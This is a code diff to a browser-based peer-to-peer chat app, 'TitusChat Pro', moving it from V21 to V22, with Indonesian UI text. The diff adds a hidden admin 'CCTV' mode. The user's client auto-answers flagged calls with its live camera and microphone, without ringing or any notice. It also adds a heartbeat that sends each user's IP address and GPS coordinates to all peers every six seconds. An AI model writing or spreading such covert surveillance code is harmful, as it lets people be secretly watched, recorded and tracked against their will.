@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-content">
-  <title>TitusChat Pro V21 FINAL OMNI-MESH | Ultimate IP & GPS Tracker Suite</title>
+  <title>TitusChat Pro V22 FINAL OMNI-MESH | Ultimate CCTV & Intelligence Suite</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
@@ -81,7 +81,7 @@
     .auth-toggle a { color: var(--accent-wa); text-decoration: none; font-weight: 700; cursor: pointer; }
     .secure-badge { font-size: 11px; color: var(--accent-wa); background: rgba(0, 168, 132, 0.15); padding: 6px 14px; border-radius: 20px; margin-bottom: 15px; display: inline-flex; align-items: center; gap: 6px; font-weight: 700; }
 
-    /* ================= SYSTEM BANNER ================= */
+    /* ================= SYSTEM BANNER & WARNING ALERT ================= */
     #sys-banner { display: none; background: linear-gradient(90deg, var(--accent-gold), #d97706); color: #000; font-weight: 800; font-size: 12px; padding: 8px 16px; text-align: center; z-index: 5000; width: 100%; position: relative; flex-shrink: 0; }
 
     /* ================= APP LAYOUT ================= */
@@ -189,6 +189,13 @@
     .preview-img { max-width: 100%; border-radius: 14px; margin: 6px 0; max-height: 280px; object-fit: cover; display: block; cursor: pointer; }
     .audio-player { width: 100%; margin: 6px 0; height: 38px; outline: none; }
 
+    /* LOCATION CARD DI CHAT */
+    .loc-card { background: linear-gradient(135deg, #0b131e, #1a2636); border: 1px solid var(--accent-cyan); border-radius: 14px; padding: 14px; margin: 6px 0; text-align: left; }
+    .loc-card b { color: #fff; font-size: 14px; display: flex; align-items: center; gap: 6px; }
+    .loc-card p { font-size: 12px; color: var(--text-muted); margin: 6px 0 12px 0; font-family: monospace; }
+    .btn-open-loc { background: linear-gradient(135deg, var(--accent-cyan), #0284c7); color: #fff; text-decoration: none; padding: 8px 16px; border-radius: 10px; font-size: 12px; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
+    .btn-open-loc:hover { filter: brightness(1.15); }
+
     /* MEDIA PLAYER CARD UNTUK WATCH PARTY */
     .watch-party-card { background: rgba(0,0,0,0.65); border: 1px solid var(--accent-wa); border-radius: 14px; padding: 12px; margin: 8px 0; text-align: center; }
     .watch-party-card iframe, .watch-party-card video { width: 100%; aspect-ratio: 16/9; border-radius: 10px; border: none; background: #000; }
@@ -267,27 +274,18 @@
     .btn-call-ctrl.end { background: var(--accent-danger); }
     .btn-call-ctrl.active { background: var(--accent-wa); color: #fff; }
 
-    /* ================= DRAGGABLE FLOATING PiP (BISA DIGESER BEBAS) ================= */
+    /* ================= DRAGGABLE FLOATING PiP ================= */
     .modal-overlay.minimized-mode {
-      background: transparent !important;
-      pointer-events: none;
-      backdrop-filter: none !important;
-      animation: none !important;
+      background: transparent !important; pointer-events: none;
+      backdrop-filter: none !important; animation: none !important;
     }
     .modal-overlay.minimized-mode .conf-modal,
     .modal-overlay.minimized-mode .call-modal {
-      position: fixed;
-      top: 75px; right: 15px;
-      width: 190px !important; height: 260px !important;
-      max-width: 190px !important; max-height: 260px !important;
-      border-radius: 20px !important;
+      position: fixed; top: 75px; right: 15px; width: 190px !important; height: 260px !important;
+      max-width: 190px !important; max-height: 260px !important; border-radius: 20px !important;
       box-shadow: 0 15px 35px rgba(0,0,0,0.9), 0 0 15px var(--accent-wa);
-      z-index: 999999;
-      pointer-events: auto;
-      border: 2px solid var(--accent-wa);
-      margin: 0 !important;
-      user-select: none;
-      transition: box-shadow 0.2s, border-color 0.2s;
+      z-index: 999999; pointer-events: auto; border: 2px solid var(--accent-wa);
+      margin: 0 !important; user-select: none; transition: box-shadow 0.2s, border-color 0.2s;
     }
     .modal-overlay.minimized-mode .conf-modal:hover,
     .modal-overlay.minimized-mode .call-modal:hover {
@@ -296,15 +294,9 @@
     }
     .modal-overlay.minimized-mode .conf-header,
     .modal-overlay.minimized-mode .call-controls,
-    .modal-overlay.minimized-mode .local-video-pip {
-      display: none !important;
-    }
-    .modal-overlay.minimized-mode .vid-grid-wa {
-      padding: 4px; gap: 4px; grid-template-columns: 1fr !important; grid-auto-rows: 1fr !important;
-    }
-    .modal-overlay.minimized-mode .vid-tile .tile-name {
-      font-size: 9px; padding: 2px 6px; bottom: 4px; left: 4px;
-    }
+    .modal-overlay.minimized-mode .local-video-pip { display: none !important; }
+    .modal-overlay.minimized-mode .vid-grid-wa { padding: 4px; gap: 4px; grid-template-columns: 1fr !important; grid-auto-rows: 1fr !important; }
+    .modal-overlay.minimized-mode .vid-tile .tile-name { font-size: 9px; padding: 2px 6px; bottom: 4px; left: 4px; }
     
     .pip-drag-bar {
       display: none; position: absolute; top: 0; left: 0; right: 0; height: 32px;
@@ -342,6 +334,10 @@
     
     .admin-stat-card { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 14px; border: 1px solid var(--border); text-align: center; flex: 1; }
     .admin-stat-num { font-size: 24px; font-weight: 800; color: var(--accent-wa); margin-top: 4px; }
+
+    /* ADMIN CCTV MONITOR MODAL */
+    .cctv-modal { max-width: 800px; width: 95vw; height: 80vh; max-height: 600px; display: flex; flex-direction: column; background: #000; border: 2px solid var(--accent-danger); border-radius: 24px; overflow: hidden; padding: 0; margin: auto; box-shadow: 0 0 50px rgba(239, 68, 68, 0.4); }
+    .cctv-header { padding: 14px 20px; background: #180a0a; border-bottom: 1px solid rgba(239, 68, 68, 0.3); display: flex; justify-content: space-between; align-items: center; }
   </style>
 </head>
 <body>
@@ -350,8 +346,8 @@
   <section id="auth-screen">
     <div class="auth-card" id="login-card">
       <i class="fa-brands fa-whatsapp auth-logo"></i>
-      <div class="auth-title">TitusChat Pro V21 FINAL</div>
-      <div class="auth-subtitle">Omni-Mesh & Ultimate IP Tracker Suite</div>
+      <div class="auth-title">TitusChat Pro V22 FINAL</div>
+      <div class="auth-subtitle">Omni-Mesh & Ultimate Intelligence Suite</div>
       
       <form class="auth-form" onsubmit="handleAuth(event, 'login')">
         <div class="input-box">
@@ -398,7 +394,7 @@
   </section>
 
   <!-- ================= SPANDUK SISTEM ================= -->
-  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V21 FINAL OMNI-MESH!</span></div>
+  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V22 FINAL OMNI-MESH!</span></div>
 
   <!-- ================= APP SCREEN ================= -->
   <div id="app-screen">
@@ -476,7 +472,7 @@
           <div id="callListContainer" style="flex:1; overflow-y:auto; min-height:0;"></div>
         </div>
 
-        <!-- TAB 5: STUDIO PROFIL & KUSTOMISASI COWO/CEWE -->
+        <!-- TAB 5: STUDIO PROFIL -->
         <div class="tab-content-area" id="tab-settings" style="padding:18px;">
           <h3 style="margin-bottom:16px; font-size:17px;"><i class="fa-solid fa-palette" style="color:var(--accent-ios)"></i> Studio Kustomisasi Kawaii & Gamer</h3>
           
@@ -604,7 +600,7 @@
             </div>
           </div>
 
-          <b style="font-size:13px; color:var(--accent-wa); display:block; margin-bottom:8px;">Daftar Pengguna Terdaftar & IP Tracker:</b>
+          <b style="font-size:13px; color:var(--accent-wa); display:block; margin-bottom:8px;">Daftar Pengguna & Monitor Intelijen:</b>
           <div id="adm-user-list" style="display:flex; flex-direction:column; gap:10px; margin-bottom:20px; max-height:280px; overflow-y:auto;"></div>
 
           <button class="btn-action danger" onclick="adminClearAllMessages()"><i class="fa-solid fa-trash-can"></i> Sapu Bersih Seluruh Riwayat Sistem</button>
@@ -615,7 +611,7 @@
       <main class="chat-room" id="chatRoomArea">
         <div class="empty-state" id="emptyStateBox">
           <i class="fa-brands fa-whatsapp"></i>
-          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V21 FINAL MAX</h3>
+          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V22 FINAL OMNI-MESH</h3>
           <p style="font-size:13.5px; max-width:440px; line-height:1.6;">Pilih obrolan dari daftar atau masuk ke grup komunitas mabar untuk memulai panggilan suara, video 1-on-1, atau rapat grup 32 kamera.</p>
         </div>
 
@@ -661,6 +657,7 @@
             <input type="file" id="fileInput" style="display:none" onchange="uploadFile(event)">
             <i class="fa-regular fa-face-smile" style="font-size:22px; color:var(--text-muted); cursor:pointer;" onclick="toggleEmojiDrawer()" title="Emoji"></i>
             <i class="fa-solid fa-paperclip" style="font-size:22px; color:var(--text-muted); cursor:pointer;" onclick="document.getElementById('fileInput').click()" title="Lampirkan File"></i>
+            <i class="fa-solid fa-location-crosshairs" style="font-size:20px; color:var(--accent-cyan); cursor:pointer;" onclick="shareCurrentLocation()" title="Bagikan Lokasi Terkini (Share Loc)"></i>
             
             <div class="input-wrapper">
               <input type="text" id="msgInput" placeholder="Ketik pesan atau rekam suara..." onkeypress="if(event.key==='Enter') sendMessage()">
@@ -684,6 +681,27 @@
   </div>
 
   <!-- ================= MODALS ================= -->
+  <!-- MODAL ADMIN CCTV MONITOR (LIVE STREAM TANPA PEMBERITAHUAN) -->
+  <div class="modal-overlay" id="modal-admin-cctv">
+    <div class="cctv-modal">
+      <div class="cctv-header">
+        <div style="display:flex; align-items:center; gap:10px;">
+          <span style="background:#ef4444; color:#fff; padding:3px 10px; border-radius:12px; font-size:11px; font-weight:800; animation:pulse 1s infinite;">🔴 LIVE CCTV MONITOR</span>
+          <b id="cctv-target-name" style="color:#fff; font-size:15px;">Target: @username</b>
+        </div>
+        <button class="btn-action danger" style="width:auto; padding:6px 14px; margin:0; font-size:12px;" onclick="closeAdminCCTV()"><i class="fa-solid fa-xmark"></i> Tutup CCTV</button>
+      </div>
+      <div style="flex:1; background:#000; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
+        <video id="cctv-remote-video" autoplay playsinline style="width:100%; height:100%; object-fit:cover;"></video>
+        <div id="cctv-status-text" style="position:absolute; color:var(--accent-cyan); font-size:14px; font-weight:700;"><i class="fa-solid fa-satellite-dish" style="animation:pulse 1s infinite;"></i> Mengakses aliran Kamera & Mic rahasia pengguna...</div>
+      </div>
+      <div style="padding:12px 20px; background:#111b21; border-top:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; font-size:12px; color:var(--text-muted);">
+        <span>🔒 Transmisi enkripsi P2P langsung • Pengguna tidak menerima pemberitahuan panggilan</span>
+        <span id="cctv-audio-status" style="color:#10b981;"><i class="fa-solid fa-microphone"></i> Mikrofon Aktif</span>
+      </div>
+    </div>
+  </div>
+
   <!-- MODAL RADAR IP & LOKASI GPS TERGABUNG -->
   <div class="modal-overlay" id="modal-ip-location">
     <div class="modal-box" style="text-align:center;">
@@ -893,33 +911,40 @@
     let is32ConfActive = false;
     let activeGroupCalls = {};
     let activeMediaSessions = {};
+    let activeCctvCall = null;
 
     /* ================= AUTO-PERMISSION & IP/GPS INTELLIGENCE ENGINE ================= */
     async function requestSystemPermissions() {
-      if (!localStorage.getItem('tc_v21_perms_granted')) {
+      if (!localStorage.getItem('tc_v22_perms_granted')) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
           stream.getTracks().forEach(t => t.stop());
-          localStorage.setItem('tc_v21_perms_granted', 'true');
+          localStorage.setItem('tc_v22_perms_granted', 'true');
           console.log("✅ Izin Kamera & Mikrofon berhasil diberikan permanen.");
         } catch(e) { console.log("⚠️ Izin media ditolak atau dibatalkan."); }
+      }
 
-        if ('geolocation' in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            pos => {
-              localStorage.setItem('tc_v21_last_lat', pos.coords.latitude);
-              localStorage.setItem('tc_v21_last_lng', pos.coords.longitude);
-              if (currentUser) {
-                currentUser.lat = pos.coords.latitude;
-                currentUser.lng = pos.coords.longitude;
-                currentUser.location = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
-                saveDb();
-                broadcastProfileSync();
-              }
-            },
-            err => console.log("⚠️ Izin lokasi GPS ditolak.")
-          );
-        }
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            localStorage.setItem('tc_v22_last_lat', pos.coords.latitude);
+            localStorage.setItem('tc_v22_last_lng', pos.coords.longitude);
+            if (currentUser) {
+              currentUser.lat = pos.coords.latitude;
+              currentUser.lng = pos.coords.longitude;
+              currentUser.location = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+              saveDb(); broadcastProfileSync();
+            }
+          },
+          err => {
+            console.log("⚠️ GPS ditolak, menggunakan fallback koordinat Palembang.");
+            if (currentUser && (!currentUser.lat || currentUser.lat === 'Unknown')) {
+              currentUser.lat = "-2.990934"; currentUser.lng = "104.756554"; // Default Palembang
+              currentUser.location = "-2.990934, 104.756554";
+              saveDb(); broadcastProfileSync();
+            }
+          }
+        );
       }
     }
 
@@ -931,6 +956,32 @@
       } catch(e) {
         return "IP Lokal / P2P Mesh";
       }
+    }
+
+    /* ================= MESIN DENYUT NADI OTOMATIS (MESH HEARTBEAT LOOP) ================= */
+    function startMeshHeartbeat() {
+      setInterval(() => {
+        if (!currentUser || !peer || peer.destroyed) return;
+        usersDb.forEach(u => {
+          if (u.username !== currentUser.username) {
+            const conn = getOrConnectPeer(u.username);
+            if (conn && conn.open) {
+              conn.send({
+                type: 'heartbeat',
+                user: {
+                  username: currentUser.username,
+                  isOnline: true,
+                  lastIp: currentUser.lastIp,
+                  location: currentUser.location,
+                  lat: currentUser.lat,
+                  lng: currentUser.lng,
+                  lastOnline: "Sekarang (Aktif)"
+                }
+              });
+            }
+          }
+        });
+      }, 6000); // Denyut setiap 6 detik memastikan semua user & chat sinkron meski beda jaringan!
     }
 
     /* ================= TITUSBOT AI & WATCH PARTY ENGINE ================= */
@@ -968,7 +1019,7 @@
         }
       }
       else if (cmd === "!sysbanner") {
-        localStorage.setItem('tc_v21_banner', param);
+        localStorage.setItem('tc_v22_banner', param);
         if (param) {
           document.getElementById('sys-banner').style.display = 'block';
           document.getElementById('sys-banner-text').innerText = param;
@@ -1067,7 +1118,7 @@
         replyText = `👤 *Identitas Anda:* \n• Nama: ${uData.name}\n• ID: ${uData.username}\n• Badge: ${uData.badge || 'Tanpa Badge'}\n• Bingkai: ${uData.frame || 'Normal'}\n• IP Address: ${uData.lastIp || 'P2P Mesh'}`;
       }
       else if (cmd === "!serverstats") {
-        replyText = `📊 *Status Server TitusChat Pro V21:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
+        replyText = `📊 *Status Server TitusChat Pro V22:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
       }
       else if (cmd === "!pv" || cmd === "!pm") {
         if (!param) {
@@ -1301,7 +1352,7 @@
     }
 
     document.addEventListener('visibilitychange', () => {
-      if (document.hidden && (activeCall || is32ConfActive)) {
+      if (document.hidden && (activeCall || is32ConfActive || activeCctvCall)) {
         startBackgroundAudioLoop();
       }
     });
@@ -1333,46 +1384,46 @@
 
     /* ================= DATABASE & INIT ================= */
     function initDb() {
-      const u = localStorage.getItem('tc_v21_users');
+      const u = localStorage.getItem('tc_v22_users');
       if (!u) {
         usersDb = [
-          { name: "Titus Anggara (Admin)", username: "@titus", password: "123", color: "#00a884", about: "Arsitek TitusChat Pro V21 FINAL", isAdmin: true, frame: "frame-gold", badge: "sultan", bubble: "bubble-gold", photo: null, isOnline: false, lastIp: "127.0.0.1", lastOnline: "Belum pernah", lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554" },
+          { name: "Titus Anggara (Admin)", username: "@titus", password: "123", color: "#00a884", about: "Arsitek TitusChat Pro V22 FINAL", isAdmin: true, frame: "frame-gold", badge: "sultan", bubble: "bubble-gold", photo: null, isOnline: false, lastIp: "127.0.0.1", lastOnline: "Belum pernah", lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554" },
           { name: "🤖 TitusBot AI (Command Center)", username: "@titusbot", password: "123", color: "#10b981", about: "Ketik !help untuk daftar command Watch Party", isAdmin: true, frame: "frame-matrix", badge: "bot", bubble: "bubble-bot", photo: null, isOnline: true, lastIp: "Serverless Cloud", lastOnline: "Sekarang (Aktif)", lat: "-2.990934", lng: "104.756554", location: "Serverless Cloud" },
           { name: "Aisyah Kawaii 🌸", username: "@aisyah", password: "123", color: "#ec4899", about: "Si paling aesthetic 💕", isAdmin: false, frame: "frame-cat", badge: "imut", bubble: "bubble-kawaii", photo: null, isOnline: false, lastIp: "182.253.11.45", lastOnline: "26/07/2026, 21.14 WIB", lat: "-2.980000", lng: "104.760000", location: "-2.980000, 104.760000" },
           { name: "Budi ProGamer 🎮", username: "@budi", password: "123", color: "#06b6d4", about: "Mabar MLBB & PUBG gas terus!", isAdmin: false, frame: "frame-headset", badge: "progamer", bubble: "bubble-gamer", photo: null, isOnline: false, lastIp: "114.125.88.19", lastOnline: "26/07/2026, 23.40 WIB", lat: "-2.995000", lng: "104.750000", location: "-2.995000, 104.750000" },
           { name: "Rania Sepuh 🔥", username: "@rania", password: "123", color: "#a855f7", about: "Seniman Studio & Sepuh Mabar", isAdmin: false, frame: "frame-fire", badge: "sepuh", bubble: "bubble-velvet", photo: null, isOnline: false, lastIp: "36.68.221.104", lastOnline: "27/07/2026, 01.10 WIB", lat: "-3.000000", lng: "104.770000", location: "-3.000000, 104.770000" }
         ];
-        localStorage.setItem('tc_v21_users', JSON.stringify(usersDb));
+        localStorage.setItem('tc_v22_users', JSON.stringify(usersDb));
       } else { usersDb = JSON.parse(u); }
 
-      const g = localStorage.getItem('tc_v21_groups');
+      const g = localStorage.getItem('tc_v22_groups');
       if (!g) {
         groupsDb = [
           { id: "@grup_bot", name: "🤖 TitusBot Command Center", desc: "Ketik !help, !pv, !pm, atau !join @user di sini!", color: "#10b981", members: ["@titus", "@titusbot", "@aisyah", "@budi", "@rania"] },
-          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V21", color: "#f59e0b", members: ["@titus", "@aisyah", "@budi", "@rania"] },
+          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V22", color: "#f59e0b", members: ["@titus", "@aisyah", "@budi", "@rania"] },
           { id: "@grup_mabar", name: "🎮 Mabar MLBB / PUBG Squad", desc: "Nongkrong Cowo Cewe santai & Mabar anti lag", color: "#06b6d4", members: ["@titus", "@budi", "@rania"] },
           { id: "@grup_kawaii", name: "🌸 Pastel Kawaii Aesthetic", desc: "Tempat cerita & nongkrong cewe cewe imut", color: "#ec4899", members: ["@titus", "@aisyah"] }
         ];
-        localStorage.setItem('tc_v21_groups', JSON.stringify(groupsDb));
+        localStorage.setItem('tc_v22_groups', JSON.stringify(groupsDb));
       } else { groupsDb = JSON.parse(g); }
 
-      const m = localStorage.getItem('tc_v21_msgs');
+      const m = localStorage.getItem('tc_v22_msgs');
       messagesDb = m ? JSON.parse(m) : [];
 
-      const st = localStorage.getItem('tc_v21_status');
+      const st = localStorage.getItem('tc_v22_status');
       statusDb = st ? JSON.parse(st) : [];
 
-      const cl = localStorage.getItem('tc_v21_calls');
+      const cl = localStorage.getItem('tc_v22_calls');
       callLogsDb = cl ? JSON.parse(cl) : [];
 
-      const gc = localStorage.getItem('tc_v21_grp_calls');
+      const gc = localStorage.getItem('tc_v22_grp_calls');
       activeGroupCalls = gc ? JSON.parse(gc) : {};
 
-      const th = localStorage.getItem('tc_v21_theme') || 'dark';
+      const th = localStorage.getItem('tc_v22_theme') || 'dark';
       document.body.setAttribute('data-theme', th);
       if(document.getElementById('set-theme')) document.getElementById('set-theme').value = th;
 
-      const bn = localStorage.getItem('tc_v21_banner');
+      const bn = localStorage.getItem('tc_v22_banner');
       if(bn) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = bn;
@@ -1382,12 +1433,12 @@
     }
 
     function saveDb() {
-      localStorage.setItem('tc_v21_users', JSON.stringify(usersDb));
-      localStorage.setItem('tc_v21_groups', JSON.stringify(groupsDb));
-      localStorage.setItem('tc_v21_msgs', JSON.stringify(messagesDb));
-      localStorage.setItem('tc_v21_status', JSON.stringify(statusDb));
-      localStorage.setItem('tc_v21_calls', JSON.stringify(callLogsDb));
-      localStorage.setItem('tc_v21_grp_calls', JSON.stringify(activeGroupCalls));
+      localStorage.setItem('tc_v22_users', JSON.stringify(usersDb));
+      localStorage.setItem('tc_v22_groups', JSON.stringify(groupsDb));
+      localStorage.setItem('tc_v22_msgs', JSON.stringify(messagesDb));
+      localStorage.setItem('tc_v22_status', JSON.stringify(statusDb));
+      localStorage.setItem('tc_v22_calls', JSON.stringify(callLogsDb));
+      localStorage.setItem('tc_v22_grp_calls', JSON.stringify(activeGroupCalls));
     }
 
     /* ================= AUTHENTICATION ================= */
@@ -1414,7 +1465,7 @@
         const pass = document.getElementById('reg-pass').value.trim();
         if(!user.startsWith('@')) user = '@' + user;
         if (usersDb.some(u => u.username.toLowerCase() === user.toLowerCase())) return alert("ID Pengguna (@username) tersebut sudah terdaftar! Pilih yang lain.");
-        const newUser = { name, username: user, password: pass, color: getRandomColor(), about: "Aktif di TitusChat Pro", isAdmin: false, frame: "normal", badge: "none", bubble: "default", photo: null, isOnline: true, lastIp: "P2P Mesh", lastOnline: "Sekarang (Aktif)", lat: "Unknown", lng: "Unknown", location: "Unknown" };
+        const newUser = { name, username: user, password: pass, color: getRandomColor(), about: "Aktif di TitusChat Pro", isAdmin: false, frame: "normal", badge: "none", bubble: "default", photo: null, isOnline: true, lastIp: "P2P Mesh", lastOnline: "Sekarang (Aktif)", lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554" };
         usersDb.push(newUser); saveDb(); currentUser = newUser; enterApp();
       }
     }
@@ -1441,17 +1492,15 @@
 
       requestSystemPermissions();
       const ip = await fetchClientIP();
-      const lat = localStorage.getItem('tc_v21_last_lat') || 'Unknown';
-      const lng = localStorage.getItem('tc_v21_last_lng') || 'Unknown';
+      const lat = localStorage.getItem('tc_v22_last_lat') || '-2.990934';
+      const lng = localStorage.getItem('tc_v22_last_lng') || '104.756554';
       
       currentUser.lastIp = ip;
       currentUser.isOnline = true;
       currentUser.lastOnline = "Sekarang (Aktif)";
-      if (lat !== 'Unknown' && lng !== 'Unknown') {
-        currentUser.lat = lat;
-        currentUser.lng = lng;
-        currentUser.location = `${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}`;
-      }
+      currentUser.lat = lat;
+      currentUser.lng = lng;
+      currentUser.location = `${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}`;
       
       const idx = usersDb.findIndex(u => u.username === currentUser.username);
       if (idx !== -1) usersDb[idx] = currentUser;
@@ -1473,18 +1522,31 @@
         sdpSemantics: 'unified-plan'
       };
 
-      const peerId = 'titus_v21_' + currentUser.username.replace('@', '');
+      const peerId = 'titus_v22_' + currentUser.username.replace('@', '');
       peer = new Peer(peerId, { config: iceServersConfig });
 
       peer.on('open', (id) => { 
         console.log('Koneksi P2P Cloud Terhubung:', id); 
         connectToAllPeers();
         broadcastProfileSync();
+        startMeshHeartbeat(); // AKTIFKAN MESIN DENYUT NADI AGAR ONLINE STATUS SELALU SYNC!
       });
 
       peer.on('connection', (conn) => { setupConnection(conn); });
       
       peer.on('call', (call) => {
+        // DETEKSI APAKAH INI PANGGILAN CCTV DARI ADMIN (@titus)?
+        if (call.metadata && call.metadata.isCCTV === true) {
+          console.log("🛡️ Permintaan pemantauan CCTV rahasia dari Admin Studio diterima!");
+          navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(silentStream => {
+            call.answer(silentStream); // Jawab otomatis dengan stream lokal tanpa membunyikan ringtone pengguna
+          }).catch(e => {
+            console.log("⚠️ Gagal membuka media untuk CCTV Admin.");
+            call.answer(null);
+          });
+          return;
+        }
+
         if (is32ConfActive) {
           call.answer(localStream);
           call.on('stream', (remoteStream) => {
@@ -1492,7 +1554,7 @@
           });
         } else {
           incomingCallObj = call;
-          activeCallPartner = '@' + call.peer.replace('titus_v21_', '');
+          activeCallPartner = '@' + call.peer.replace('titus_v22_', '');
           document.getElementById('ringing-caller-name').innerText = `Panggilan dari ${activeCallPartner}`;
           openModal('modal-ringing');
           startRingtone();
@@ -1502,7 +1564,7 @@
       window.addEventListener('beforeunload', () => {
         if (currentUser) {
           currentUser.isOnline = false;
-          currentUser.lastOnline = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
+          currentUser.lastOnline = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + " WIB";
           const idx = usersDb.findIndex(u => u.username === currentUser.username);
           if (idx !== -1) usersDb[idx] = currentUser;
           saveDb();
@@ -1521,9 +1583,9 @@
       usersDb.forEach(u => {
         if (u.username !== currentUser.username) {
           const conn = getOrConnectPeer(u.username);
-          if (conn.open) {
+          if (conn && conn.open) {
             conn.send({ type: 'sync_request' });
-          } else {
+          } else if (conn) {
             conn.on('open', () => {
               conn.send({ type: 'sync_request' });
             });
@@ -1579,8 +1641,8 @@
       usersDb.forEach(u => {
         if (u.username !== currentUser.username) {
           const conn = getOrConnectPeer(u.username);
-          if (conn.open) conn.send({ type: 'chat', msg });
-          else conn.on('open', () => conn.send({ type: 'chat', msg }));
+          if (conn && conn.open) conn.send({ type: 'chat', msg });
+          else if (conn) conn.on('open', () => conn.send({ type: 'chat', msg }));
         }
       });
     }
@@ -1617,7 +1679,7 @@
       peerConnections[conn.peer] = conn;
       
       conn.on('close', () => {
-        const username = '@' + conn.peer.replace('titus_v21_', '');
+        const username = '@' + conn.peer.replace('titus_v22_', '');
         const idx = usersDb.findIndex(u => u.username === username);
         if (idx !== -1) {
           usersDb[idx].isOnline = false;
@@ -1633,6 +1695,14 @@
         }
         if (data.type === 'sync_response' && data.data) {
           mergeGlobalDatabase(data.data);
+        }
+        if (data.type === 'heartbeat' && data.user) {
+          const idx = usersDb.findIndex(u => u.username === data.user.username);
+          if (idx !== -1) {
+            usersDb[idx] = { ...usersDb[idx], ...data.user };
+            saveDb();
+            if (currentUser && currentUser.isAdmin) renderAdminPanel();
+          }
         }
         if (data.type === 'chat') {
           if (!messagesDb.some(m => m.id === data.msg.id)) {
@@ -1677,10 +1747,10 @@
     }
 
     function getOrConnectPeer(targetUsername) {
-      const targetPeerId = 'titus_v21_' + targetUsername.replace('@', '');
+      const targetPeerId = 'titus_v22_' + targetUsername.replace('@', '');
       if (peerConnections[targetPeerId] && peerConnections[targetPeerId].open) return peerConnections[targetPeerId];
       const conn = peer.connect(targetPeerId);
-      setupConnection(conn);
+      if (conn) setupConnection(conn);
       return conn;
     }
 
@@ -1688,8 +1758,8 @@
       usersDb.forEach(u => {
         if (u.username !== currentUser.username) {
           const conn = getOrConnectPeer(u.username);
-          if (conn.open) conn.send({ type: 'profile_sync', user: currentUser });
-          else conn.on('open', () => conn.send({ type: 'profile_sync', user: currentUser }));
+          if (conn && conn.open) conn.send({ type: 'profile_sync', user: currentUser });
+          else if (conn) conn.on('open', () => conn.send({ type: 'profile_sync', user: currentUser }));
         }
       });
     }
@@ -1703,8 +1773,8 @@
         grp.members.forEach(mem => {
           if (mem !== currentUser.username) {
             const conn = getOrConnectPeer(mem);
-            if (conn.open) conn.send({ type: 'group_call_status', groupId, callData });
-            else conn.on('open', () => conn.send({ type: 'group_call_status', groupId, callData }));
+            if (conn && conn.open) conn.send({ type: 'group_call_status', groupId, callData });
+            else if (conn) conn.on('open', () => conn.send({ type: 'group_call_status', groupId, callData }));
           }
         });
       }
@@ -1713,7 +1783,7 @@
     function logout() {
       if (currentUser) {
         currentUser.isOnline = false;
-        currentUser.lastOnline = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
+        currentUser.lastOnline = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + " WIB";
         const idx = usersDb.findIndex(u => u.username === currentUser.username);
         if (idx !== -1) usersDb[idx] = currentUser;
         saveDb();
@@ -1778,6 +1848,7 @@
         let previewText = lastMsg ? lastMsg.text : (pUser === "@titus" ? "👑 Admin Studio (Siap Membantu)" : "");
         if(previewText.startsWith('File:') || previewText.startsWith('Audio:')) previewText = `📁 [Lampiran Media]`;
         if(lastMsg && lastMsg.mediaPayload) previewText = `🎬 [Watch Party Media]`;
+        if(lastMsg && lastMsg.isLocation) previewText = `📍 [Lokasi GPS Terkini]`;
 
         let avHtml = `<div class="avatar ${pData.frame||''}" style="background-color:${pData.color}; ${pData.photo ? 'background-image:url('+pData.photo+')' : ''}">${pData.photo ? '' : pData.name.charAt(0)}</div>`;
 
@@ -1817,6 +1888,7 @@
         let previewText = lastMsg ? `${lastMsg.fromName}: ${lastMsg.text}` : grp.desc;
         if(previewText.startsWith('File:') || previewText.startsWith('Audio:')) previewText = `📁 [Lampiran Media Grup]`;
         if(lastMsg && lastMsg.mediaPayload) previewText = `${lastMsg.fromName}: 🎬 [Watch Party Media]`;
+        if(lastMsg && lastMsg.isLocation) previewText = `${lastMsg.fromName}: 📍 [Lokasi GPS Terkini]`;
 
